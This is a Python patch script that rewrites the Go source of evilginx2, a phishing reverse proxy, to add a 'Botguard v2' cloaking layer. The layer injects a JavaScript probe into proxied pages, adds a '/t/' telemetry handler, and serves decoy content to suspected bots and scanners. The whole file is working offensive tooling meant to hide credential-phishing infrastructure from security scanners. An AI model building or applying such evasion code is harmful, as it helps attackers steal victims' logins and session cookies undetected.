#!/usr/bin/env python3
# patch_botguard2.py — Botguard v2 wiring: fields, /t/ handler, probe injection,
# new isBotRequest signature, -bg-grace flag. Run in ~/evilginx2-src.
import sys

def patch(path, old, new):
    src = open(path, "r", encoding="utf-8").read()
    n = src.count(old)
    if n != 1:
        sys.exit(f"[abort] {path}: pattern found {n}x (need exactly 1):\n{old[:160]}")
    open(path, "w", encoding="utf-8").write(src.replace(old, new))
    print(f"[patch] {path} OK")

# 1) struct fields (extend the botguard block)
patch("core/http_proxy.go",
      "\tbg_grease         map[string]bool\n"
      "\tbg_mtx            sync.Mutex\n",
      "\tbg_grace          int\n"
      "\tbg_grease         map[string]bool\n"
      "\tbgStateMap        map[string]*bgSessionState\n"
      "\tbg_tokens         map[string]string\n"
      "\tbg_mtx            sync.Mutex\n")

# 2) init
patch("core/http_proxy.go",
      "\tp.bg_grease = make(map[string]bool)\n",
      "\tp.bg_grease = make(map[string]bool)\n"
      "\tp.bgStateMap = make(map[string]*bgSessionState)\n"
      "\tp.bg_tokens = make(map[string]string)\n"
      "\tp.bg_grace = 8\n")

# 3) call site: pass proxy-session for gating
patch("core/http_proxy.go",
      "\t\t\tif p.isBotRequest(req) {\n"
      "\t\t\t\treturn p.decoyRequest(req)\n"
      "\t\t\t}\n",
      "\t\t\tif p.isBotRequest(req, ps) {\n"
      "\t\t\t\treturn p.decoyRequest(req)\n"
      "\t\t\t}\n")

# 4) /t/ telemetry endpoint (before the /s/ handlers)
patch("core/http_proxy.go",
      '\t\t\tjs_inject_re := regexp.MustCompile("^\\\\/s\\\\/([^\\\\/]*)\\\\/([^\\\\/]*)")\n'
      "\n"
      "\t\t\tif js_inject_re.MatchString(req.URL.Path) {\n",
      '\t\t\tjs_inject_re := regexp.MustCompile("^\\\\/s\\\\/([^\\\\/]*)\\\\/([^\\\\/]*)")\n'
      "\n"
      '\t\t\tif strings.HasPrefix(req.URL.Path, "/t/") {\n'
      "\t\t\t\tif resp := p.botguardTelemetry(req); resp != nil {\n"
      "\t\t\t\t\treturn req, resp\n"
      "\t\t\t\t}\n"
      "\t\t\t}\n"
      "\n"
      "\t\t\tif js_inject_re.MatchString(req.URL.Path) {\n")

# 5) inject the probe into HTML responses for unverified sessions
patch("core/http_proxy.go",
      "\t\t\t\t\t\t\tjs_id, _, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)\n"
      "\t\t\t\t\t\t\tif err == nil {\n"
      "\t\t\t\t\t\t\t\tbody = p.injectJavascriptIntoBody(body, \"\", fmt.Sprintf(\"/s/%s/%s.js\", s.Id, js_id))\n"
      "\t\t\t\t\t\t\t}\n",
      "\t\t\t\t\t\t\tjs_id, _, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)\n"
      "\t\t\t\t\t\t\tif err == nil {\n"
      "\t\t\t\t\t\t\t\tbody = p.injectJavascriptIntoBody(body, \"\", fmt.Sprintf(\"/s/%s/%s.js\", s.Id, js_id))\n"
      "\t\t\t\t\t\t\t}\n"
      "\t\t\t\t\t\t\tif p.botguard && !p.bgIsVerified(s.Id) {\n"
      "\t\t\t\t\t\t\t\tbody = p.injectJavascriptIntoBody(body, p.bgProbeScript(s.Id), \"\")\n"
      "\t\t\t\t\t\t\t}\n")

# 6) main.go flag + setter
patch("main.go",
      'var botguard_mode = flag.Bool("botguard", false, "Serve decoy content to suspected bots/scanners")\n',
      'var botguard_mode = flag.Bool("botguard", false, "Serve decoy content to suspected bots/scanners")\n'
      'var botguard_grace = flag.Int("bg-grace", 8, "Botguard JS-telemetry grace window in seconds")\n')
patch("main.go",
      "\thp.SetBotguard(*botguard_mode)\n",
      "\thp.SetBotguard(*botguard_mode)\n"
      "\thp.SetBotguardGrace(*botguard_grace)\n")

print("[done] botguard v2 patches applied")
